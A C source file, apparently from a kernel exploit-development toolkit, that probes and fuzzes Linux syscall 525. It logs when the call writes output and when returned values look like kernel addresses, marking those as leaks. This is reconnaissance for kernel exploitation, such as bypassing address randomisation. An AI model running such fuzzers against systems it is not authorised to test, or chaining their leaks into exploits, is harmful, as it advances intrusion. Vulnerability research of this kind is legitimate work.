#include "exploit.h"
#include "probe.h"
#include <sys/syscall.h>

void nk_probe_525(void) {
    nk_log("[525] probe (clean out buffer)");
    uint8_t u[16], t[32];
    memset(u, 0, 16);
    memset(t, 0, sizeof(t));
    long r1 = syscall(525, u, 16, t, 20);
    int  e1 = errno;
    memset(u, 0x87, 16);
    u[3] = 0x10;
    memset(t, 0, sizeof(t));
    long r2 = syscall(525, u, 16, t, 20);
    int  e2 = errno;
    int nz = 0;
    for (int i = 0; i < 20; i++) if (t[i]) nz++;
    nk_log("[525] r1=%ld e1=%d r2=%ld e2=%d nonzero_out=%d", r1, e1, r2, e2, nz);
    if (nz) nk_log("[+] 525 writes output");
    else    nk_log("[=] 525 returns success but writes nothing");
}

void nk_fuzz_525(void) {
    nk_log("[525f] sweeping in0 0x00..0xFF x len 16/20/24/32");
    static const size_t lens[4] = { 16, 20, 24, 32 };
    int muts = 0, leaks = 0;

    for (size_t li = 0; li < 4; li++) {
        for (int b = 0; b < 256; b++) {
            uint8_t u[32], t[32];
            memset(u, 0, sizeof(u));
            u[0] = (uint8_t)b;
            u[3] = 0x10;
            memset(t, 0xBB, lens[li]);
            long r = syscall(525, u, 16, t, lens[li]);

            int mut = 0, kp = 0;
            for (size_t i = 0; i < lens[li]; i++)
                if (t[i] != 0xBB) mut++;
            for (size_t off = 0; off + 8 <= lens[li]; off += 8) {
                uint64_t v;
                memcpy(&v, t + off, 8);
                uint32_t hi = (uint32_t)(v >> 32);
                if (hi == 0xfffffff0 || hi == 0xfffffe00) kp++;
            }

            if (kp) {
                nk_log("[525f LEAK] in0=0x%02x len=%zu r=%ld", b, lens[li], r);
                leaks++;
            } else if (mut > 0) {
                nk_log("[525f MUT] in0=0x%02x len=%zu r=%ld mut=%d", b, lens[li], r, mut);
                muts++;
            }
        }
    }
    nk_log("[525f] done mut=%d leaks=%d", muts, leaks);
}
